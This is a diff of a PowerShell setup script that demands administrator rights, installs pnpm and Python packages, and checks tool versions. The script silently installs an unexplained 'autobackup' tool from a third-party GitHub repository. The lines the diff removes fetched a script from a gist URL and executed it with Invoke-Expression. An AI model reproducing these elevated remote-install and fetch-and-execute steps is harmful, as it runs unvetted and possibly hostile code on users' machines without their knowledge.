@@ -1,7 +1,12 @@
 # Check and require admin privileges
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    Write-Output 'Need administrator privileges'
+try {
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if (-not $isAdmin) {
+        Write-Output 'Need administrator privileges'
+        exit 1
+    }
+} catch {
+    Write-Output "Error checking admin privileges: $_"
     exit 1
 }
 
@@ -60,8 +65,9 @@ $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';'
 function Install-Pnpm {
     # Check if pnpm is already installed
     try {
-        $pnpmVersion = pnpm --version 2>$null
-        if ($pnpmVersion) {
+        $pnpmVersion = pnpm --version 2>&1 | Out-String
+        $pnpmVersion = $pnpmVersion.Trim()
+        if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
             Write-Output "pnpm is already installed: $pnpmVersion"
             return $true
         }
@@ -75,13 +81,14 @@ function Install-Pnpm {
     try {
         if (Get-Command corepack -ErrorAction SilentlyContinue) {
             Write-Output "Installing pnpm via corepack..."
-            corepack enable 2>$null
-            corepack prepare pnpm@latest --activate 2>$null
+            corepack enable 2>&1 | Out-Null
+            corepack prepare pnpm@latest --activate 2>&1 | Out-Null
             $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
             
             try {
-                $pnpmVersion = pnpm --version 2>$null
-                if ($pnpmVersion) {
+                $pnpmVersion = pnpm --version 2>&1 | Out-String
+                $pnpmVersion = $pnpmVersion.Trim()
+                if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
                     Write-Output "pnpm installed via corepack: $pnpmVersion"
                     return $true
                 }
@@ -97,12 +104,13 @@ function Install-Pnpm {
     try {
         if (Get-Command npm -ErrorAction SilentlyContinue) {
             Write-Output "Installing pnpm via npm..."
-            npm install -g pnpm 2>$null
+            npm install -g pnpm 2>&1 | Out-Null
             $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
             
             try {
-                $pnpmVersion = pnpm --version 2>$null
-                if ($pnpmVersion) {
+                $pnpmVersion = pnpm --version 2>&1 | Out-String
+                $pnpmVersion = $pnpmVersion.Trim()
+                if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
                     Write-Output "pnpm installed via npm: $pnpmVersion"
                     return $true
                 }
@@ -124,8 +132,9 @@ function Install-Pnpm {
         $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
         
         try {
-            $pnpmVersion = pnpm --version 2>$null
-            if ($pnpmVersion) {
+            $pnpmVersion = pnpm --version 2>&1 | Out-String
+            $pnpmVersion = $pnpmVersion.Trim()
+            if ($pnpmVersion -and $LASTEXITCODE -eq 0) {
                 Write-Output "pnpm installed via standalone installer: $pnpmVersion"
                 return $true
             }
@@ -155,11 +164,20 @@ foreach ($pkg in $requirements) {
     $pkgName = $pkg.Name
     $pkgVersion = $pkg.Version
     try {
-        $checkCmd = "import pkg_resources; pkg_resources.get_distribution('$pkgName').version"
-        $version = python -c $checkCmd 2>$null
-        if ([version]$version -lt [version]$pkgVersion) {
-            throw
+        $checkCmd = "import pkg_resources; print(pkg_resources.get_distribution('$pkgName').version)"
+        $version = python -c $checkCmd 2>&1 | Out-String
+        $version = $version.Trim()
+        if ($LASTEXITCODE -eq 0 -and $version) {
+            try {
+                if ([version]$version -ge [version]$pkgVersion) {
+                    Write-Output "$pkgName (version $version) is already installed"
+                    continue
+                }
+            } catch {
+                # Version comparison failed, proceed to install
+            }
         }
+        throw
     } catch {
         Write-Output "Installing $pkgName >= $pkgVersion ..."
         python -m pip install "$pkgName>=$pkgVersion"
@@ -184,23 +202,49 @@ try {
 }
 
 # Install autobackup (auto-backup-wins) via pipx
+$autobackupInstalled = $false
 try {
-    autobackup --version | Out-Null
-} catch {
-    try {
-        pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
-    } catch {
-        python -m pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
+    $cmd = Get-Command autobackup -ErrorAction SilentlyContinue
+    if ($cmd) {
+        $autobackupInstalled = $true
+        Write-Output 'autobackup is already installed'
     }
-    $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
+} catch {
+
 }
 
-$gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
-try {
-    $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing
-    Invoke-Expression $remoteScript.Content
-} catch {
-    exit 1
+if (-not $autobackupInstalled) {
+    Write-Output 'autobackup not found, installing...'
+    $installed = $false
+    try {
+        pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
+        if ($LASTEXITCODE -eq 0) {
+            $installed = $true
+        }
+    } catch {
+        Write-Output "First installation attempt failed: $_"
+    }
+    
+    if (-not $installed) {
+        try {
+            python -m pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
+            if ($LASTEXITCODE -eq 0) {
+                $installed = $true
+            }
+        } catch {
+            Write-Output "Second installation attempt failed: $_"
+        }
+    }
+    
+    if ($installed) {
+        try {
+            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
+        } catch {
+            Write-Output "Warning: Failed to refresh PATH: $_"
+        }
+    } else {
+        Write-Output "Warning: Failed to install autobackup, continuing..."
+    }
 }
 
 # Automatically refresh environment variables
@@ -226,8 +270,9 @@ try {
     
     foreach ($tool in $tools) {
         try {
-            $version = & $tool.Name --version 2>$null
-            if ($version) {
+            $version = & $tool.Name --version 2>&1 | Out-String
+            $version = $version.Trim()
+            if ($version -and $LASTEXITCODE -eq 0) {
                 $versionLine = $version.Split("`n")[0]
                 Write-Output "✅ $($tool.DisplayName): $versionLine"
             } else {
